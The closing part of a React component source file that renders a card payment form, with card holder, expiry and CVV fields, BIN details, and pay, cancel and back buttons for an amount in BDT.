                  {binLoading && <span className="text-slate-400">Verifying card…</span>}
                  {!binLoading && binInfo && (
                    <>
                      {binInfo.scheme && <span className="font-semibold text-slate-700 uppercase">{binInfo.scheme}</span>}
                      {binInfo.type && <span className="rounded border border-slate-200 bg-white px-1 py-0.5 text-[8px] uppercase text-slate-600">{binInfo.type}</span>}
                      {binInfo.bank && <span className="text-slate-600" title={binInfo.bank}>{binInfo.bank}</span>}
                      {binInfo.country && <span className="ml-auto text-slate-500">{binInfo.countryEmoji} {binInfo.country}</span>}
                    </>
                  )}
                  {!binLoading && !binInfo && <span className="text-slate-400">Card details unavailable</span>}
                </div>
              )}
            </div>

            {/* Card Holder */}
            <div className="card-payment-holder-block shrink-0">
              <label className="card-payment-label text-slate-600 text-[11px] font-semibold uppercase tracking-wide mb-1.5 block">Card Holder Name</label>
              <input id="cardpaymentpage-fld-3" name="cardpaymentpage-fld-3" aria-label="cardpaymentpage field 3" type="text" value={cardHolder} data-card-field="true" onFocus={() => activateCardPreview("holder")} onBlur={handleCardFieldBlur} onChange={handleCardHolderChange} placeholder="John Doe"
                className="card-payment-input w-full border border-slate-200 rounded-xl px-3.5 py-2.5 text-[13px] text-slate-800 placeholder:text-slate-300 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 bg-slate-50/50 focus:bg-white transition-all tracking-wide" />
            </div>

            {/* Expiry + CVV */}
            <div className="card-payment-expiry-block grid shrink-0 grid-cols-[1fr_110px] gap-3">
              <div>
                <label className="card-payment-label text-slate-600 text-[11px] font-semibold uppercase tracking-wide mb-1.5 block">Expiration Date</label>
                <div className="grid grid-cols-2 gap-2">
                  <select
                    value={expiry.slice(0, 2)}
                    data-card-field="true"
                    onFocus={() => activateCardPreview("expiry")}
                    onBlur={handleCardFieldBlur}
                    onChange={(e) => {
                      const mm = e.target.value;
                      const yy = expiry.slice(3, 5);
                      setExpiry(mm && yy ? `${mm}/${yy}` : mm ? `${mm}/` : "");
                    }}
                    className="card-payment-input w-full border border-slate-200 rounded-xl px-2.5 py-2.5 text-[13px] text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 font-mono bg-slate-50/50 focus:bg-white transition-all"
                  >
                    <option value="">MM</option>
                    {Array.from({ length: 12 }).map((_, i) => {
                      const v = (i + 1).toString().padStart(2, "0");
                      return <option key={v} value={v}>{v}</option>;
                    })}
                  </select>
                  <select
                    value={expiry.slice(3, 5)}
                    data-card-field="true"
                    onFocus={() => activateCardPreview("expiry")}
                    onBlur={handleCardFieldBlur}
                    onChange={(e) => {
                      const yy = e.target.value;
                      const mm = expiry.slice(0, 2);
                      setExpiry(mm && yy ? `${mm}/${yy}` : yy ? `/${yy}` : "");
                    }}
                    className="card-payment-input w-full border border-slate-200 rounded-xl px-2.5 py-2.5 text-[13px] text-slate-800 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 font-mono bg-slate-50/50 focus:bg-white transition-all"
                  >
                    <option value="">YY</option>
                    {Array.from({ length: 12 }).map((_, i) => {
                      const yyyy = new Date().getFullYear() + i;
                      const yy = yyyy.toString().slice(-2);
                      return <option key={yy} value={yy}>{yyyy}</option>;
                    })}
                  </select>
                </div>
              </div>
              <div>
                <label className="card-payment-label text-slate-600 text-[11px] font-semibold uppercase tracking-wide mb-1.5 block">CVV</label>
                <input id="cardpaymentpage-fld-4" name="cardpaymentpage-fld-4" aria-label="cardpaymentpage field 4" type="password" inputMode="numeric" maxLength={cvvMaxLength} value={cvv} data-card-field="true" onFocus={() => activateCardPreview("cvv")} onBlur={handleCardFieldBlur}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, cvvMaxLength))}
                  placeholder={"•".repeat(cvvMaxLength)}
                  className="card-payment-input w-full border border-slate-200 rounded-xl px-3 py-2.5 text-[13px] text-slate-800 placeholder:text-slate-300 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 bg-slate-50/50 focus:bg-white transition-all font-mono text-center tracking-widest" />
              </div>
            </div>
          </div>

          {/* Pay button */}
          <button onClick={handleSubmit} disabled={!isFormValid() || isLoading}
            className={`card-payment-actions w-full py-3.5 rounded-xl text-[15px] font-semibold transition-all duration-300 mt-5 whitespace-nowrap shrink-0 flex items-center justify-center gap-2 ${isFormValid() && !isLoading ? "bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white shadow-lg shadow-blue-500/30 active:scale-[0.98]" : "bg-blue-300/70 text-white cursor-not-allowed"}`}>
            {isLoading ? (
              "Processing..."
            ) : (
              <>
                <Lock className="w-4 h-4" />
                Pay {amount} BDT
              </>
            )}
          </button>
          <div className="card-payment-action-row grid grid-cols-2 gap-3 mt-2.5 shrink-0">
            <button
              onClick={() => navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`)}
              className="py-3 rounded-xl text-[14px] font-semibold border border-red-200 text-red-600 bg-white hover:bg-red-50 transition-all flex items-center justify-center gap-2 active:scale-[0.98]"
            >
              <X className="w-4 h-4" />
              Cancel Payment
            </button>
            <button
              onClick={() => navigate(`/payment?amount=${amount}`)}
              className="py-3 rounded-xl text-[14px] font-semibold border border-slate-200 text-slate-700 bg-white hover:bg-slate-50 transition-all flex items-center justify-center gap-2 active:scale-[0.98]"
            >
              <ArrowLeft className="w-4 h-4" />
              Back
            </button>
          </div>

          {/* Footer */}
          <div className="card-payment-footer flex items-center justify-between mt-4 shrink-0">
            <div className="flex items-center gap-1.5 text-slate-400 text-[11px]">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
              <span>Protected by PCI DSS</span>
            </div>
            <div className="flex items-center gap-1 text-slate-500 text-[11px] px-2 py-1 rounded-md border border-slate-200 bg-white">
              <Globe className="w-3 h-3" /><span>English</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CardPaymentPage;
